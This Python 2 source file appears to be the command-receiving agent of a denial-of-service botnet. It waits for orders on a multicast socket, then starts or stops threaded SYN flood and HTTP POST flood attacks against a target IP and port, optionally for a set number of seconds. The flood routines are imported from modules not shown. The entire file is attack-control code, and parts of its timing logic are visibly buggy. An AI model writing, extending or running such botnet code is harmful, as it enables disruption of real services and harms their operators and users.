import sys
import threading
import socket
import time
import Queue
from multicastreceiver import *
from synflood import *

def initRcvThread():
    sock = configMulticastSock()

    eAlive = threading.Event()
    eMsg = threading.Event()
    eRead = threading.Event()

    eAlive.set()
    eMsg.clear()
    eRead.clear()

    t = threading.Thread(target = rcvMsg, args = (sock, eAlive, eMsg, eRead))
    t.setDaemon(True)
    t.start()
    return (sock, t, eAlive, eMsg, eRead) 

def initAttack():
    aEvents = [threading.Event(), threading.Event()]
    aTimes = [-1, -1]
    aTimesStart = [time.time(), time.time()]
    aQueues = [Queue.Queue(0), Queue.Queue(0)]

    return (aEvents, aTimes, aTimesStart, aQueues)

def startAttack(n, port, ip, event, attack, time):
    threads = attack
    if (attack == 0):
        threads = n

    event.set()
    queue = Queue.Queue(threads)
    for i in range(1, int(threads)+1):
        if (attack == 0):
            t = threading.Thread(target = synFlood, args = (i, port, ip, event,
                                                            queue))
        else:
            t = threading.Thread(target = httpPost, args = (0, port, ip, event,
                                                            queue, n))
        t.setDaemon(True)
        t.start()
        queue.put(i)
    reply = "SYN Flood attack started with %s attach units" % (n)
    if (attack == 1):
        reply = "HTTP Post attack started with %s attach units" % (n)
    if (time > 0):
        reply += " and will last for %s seconds" % (time)

    setReply(reply)
    return queue

def stopAttack(event, queue, attack):
    event.clear()
    queue.join()
    reply = "SYN Flood attack stoped"
    if (attack == 1):
        reply = "HTTP Post attack stoped"
    setReply(reply)

def checkTime(aEvents, aTimes, aTimesStart, aQueues):
    for i in range(0, 1):
        attack = 'SYN Flood'
        if (i > 0):
            attack = 'HTTP Post'
        if (aTimes[0] > 0) & ((time.time() - aTimesStart[0]) > aTimes[0]):
            print "[SERVO] Finishing %s (lasted for %s seconds)...\n" %\
                  (attack, aTimes[0])
            stopAttack(aEvents[0], aQueues[0], 0)
            aTimes[0] = -1

################################### INICIO ##################################### 
if __name__ == '__main__':
    print "[SERVO] Servo main thread started\n"

    (sock, rcvThread, eAlive, eMsg, eRead) = initRcvThread()
    (aEvents, aTimes, aTimesStart, aQueues) = initAttack()

    while 1:
        checkTime(aEvents, aTimes, aTimesStart, aQueues)
        if not eMsg.is_set():
            continue

        body = getBody()
        words = body.split(';')

        aFlag = 0
        if words[0] == 'http-post':
            aFlag = 1

        if words[1] == 'start':
            try:
                if (len(words) > 5):
                    t = aTimes[aFlag] = int(words[5])
                    aTimesStart[aFlag] = time.time()
                    aQueues[aFlag] = startAttack(words[2], words[3], words[4],
                                                 aEvents[aFlag], aFlag, t)
                else:
                    aQueues[aFlag] = startAttack(words[2], words[3], words[4],
                                                 aEvents[aFlag], aFlag, -1)
            except:
                setReply("Failed to initialize attack threads")
        else:
            stopAttack(aEvents[aFlag], aQueues[aFlag], aFlag)
        
        eRead.set()
        eMsg.clear()

    sock.close()

